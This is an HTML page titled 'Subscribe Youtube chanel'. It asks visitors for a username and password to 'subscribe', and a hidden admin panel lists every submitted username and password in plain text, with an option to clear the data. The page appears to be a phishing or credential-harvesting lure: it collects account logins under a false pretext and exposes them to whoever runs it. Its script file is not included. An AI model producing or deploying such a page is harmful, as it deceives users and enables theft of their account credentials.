<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Subscribe Youtube chanel</title>
  <link rel="stylesheet" href="docs\bootstrap.min.css" />
  <link rel="stylesheet" href="docs\site.css" />
</head>
<body>
  <nav class="navbar navbar-expand-sm navbar-dark bg-dark">
    
  </nav>

  <main class="container body-content">
    <section class="row" aria-labelledby="exportTitle">
      <h1 id="exportTitle">Subscribe Youtube chanel</h1>

      <div id="alertInfo" class="alert alert-info d-none" role="alert"></div>
      <div id="alertSuccess" class="alert alert-success d-none" role="alert"></div>

      <form id="subscribeForm" class="mt-3" autocomplete="off">
        <div class="mb-3">
          <label for="username" class="form-label">Username</label>
          <input type="text" class="form-control" id="username" name="username" required />
        </div>

        <div class="mb-3">
          <label for="password" class="form-label">Password</label>
          <input type="password" class="form-control" id="password" name="password" required />
        </div>

        <button type="submit" class="btn btn-primary">Subscribe</button>
      </form>

      <div id="adminActions" class="mt-4 d-none">
        <button id="toggleTable" class="btn btn-outline-secondary btn-sm" type="button">Show submissions</button>
        <button id="clearTable" class="btn btn-outline-danger btn-sm ms-2" type="button">Clear data</button>
      </div>

      

      <div id="submissions" class="mt-3 d-none">
        <h2>All Submissions</h2>
        <div id="noSubmissions" class="alert alert-warning d-none">No submissions yet.</div>
        <div class="table-responsive">
          <table class="table table-striped">
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>Created UTC</th>
              </tr>
            </thead>
            <tbody id="submissionsBody"></tbody>
          </table>
        </div>
      </div>
    </section>
    <hr />
  </main>

  <script src="docs\app.js"></script>
</body>
</html>
